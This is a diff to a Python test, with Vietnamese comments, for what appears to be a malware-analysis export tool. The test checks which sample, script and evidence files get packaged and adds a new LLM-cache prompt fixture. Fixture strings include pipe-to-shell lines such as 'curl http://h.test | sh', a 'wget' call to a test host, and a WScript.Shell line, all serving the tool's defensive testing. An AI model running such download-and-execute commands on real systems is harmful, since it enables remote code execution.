@@ -35,7 +35,7 @@ try:
     w(os.path.join(c, 'work', 'runs', 'tool', 't', 'stage2.ps1'), 'Write-Host hi\n')                   # OUT_DIR của công cụ T1b: gói
     w(os.path.join(c, 'work', 'runs', 'tool', 't.out'), 'config: host=h.test\n')                      # output của công cụ: chép rõ
     w(os.path.join(c, 'work', 'NOTES.md'), '- chạy `curl x | sh` là cấm; import os\n'); w(os.path.join(c, 'work', 'review', 'r1', 'review.json'), '{"function": 1}\n')   # file của quy trình, nội dung giống script: chép rõ
-    w(os.path.join(c, 'work', 'NOTES.md_stage2.md'), 'Add-Type y\n'); w(os.path.join(c, 'work', 'review', 'deep', 'er', 'x.md'), 'Add-Type z\n')   # tên/đường gần giống file quy trình nhưng không khớp chính xác: vẫn xét SCRIPT, gói 7z
+    w(os.path.join(c, 'work', 'NOTES.md_stage2.md'), 'Add-Type y\n'); w(os.path.join(c, 'work', 'review', 'deep', 'er', 'x.md'), 'Add-Type z\n'); w(os.path.join(c, 'work', 'review', 'llm_cache', 'k.prompt.md'), 'function f() { import os }\n')   # tên/đường gần giống file quy trình nhưng không khớp chính xác: vẫn xét SCRIPT, gói 7z
     w(os.path.join(c, 'work', 'review', 'r1', 'payload.ps1'), 'Add-Type x\n'); w(os.path.join(c, 'work', 'runs', 'watch', 's01.jsonl'), '{"cmd": "wget http://x.test"}\n')
     w(os.path.join(c, 'work', 'runs', 'dec', 'decoded.vbs'), 'Set o = CreateObject("WScript.Shell")\n')   # script giải mã: gói
     w(os.path.join(c, 'report', 'evidence', 'snip.txt'), 'curl http://h.test | sh\n')                  # trích dẫn trong evidence: chép rõ
@@ -50,7 +50,7 @@ try:
     assert info['aliases'] == [dup] and [n['file'] for n in info['notes']] == [note, note2] and sorted(p for p, _ in info['sums']) == [sums, sums2], info
     assert info['ftype'] == 'ELF x86-64' and info['notes'][0]['sha'] == 'khớp' and info['notes'][0]['path'] == '/usr/lib/x', info['notes']
     P = sorted(json.load(open(LIST)))
-    assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin', 'work/runs/mixed.txt', 'work/runs/tool/t/stage2.ps1', 'work/runs/dec/decoded.vbs', 'work/review/r1/payload.ps1', 'work/runs/watch/s01.jsonl', 'work/NOTES.md_stage2.md', 'work/review/deep/er/x.md']), P
+    assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin', 'work/runs/mixed.txt', 'work/runs/tool/t/stage2.ps1', 'work/runs/dec/decoded.vbs', 'work/review/r1/payload.ps1', 'work/runs/watch/s01.jsonl', 'work/NOTES.md_stage2.md', 'work/review/deep/er/x.md', 'work/review/llm_cache/k.prompt.md']), P
     files = sorted(os.path.relpath(os.path.join(dp, n), d) for dp, _, ns in os.walk(d) for n in ns)
     assert not any(f.startswith(('work/sample', 'work/extract', 'work/ghidra')) or '.claude' in f or f.endswith(('snap_oep.bin', 'stage1.bin', '.watch.lock')) for f in files), files
     assert {'work/runs/triage.txt', 'facts.jsonl', 'report/evidence/e.txt', 'x.bin.md', 'x.bin.html', 'README.txt', 'MANIFEST.sha256', export.ZIP,
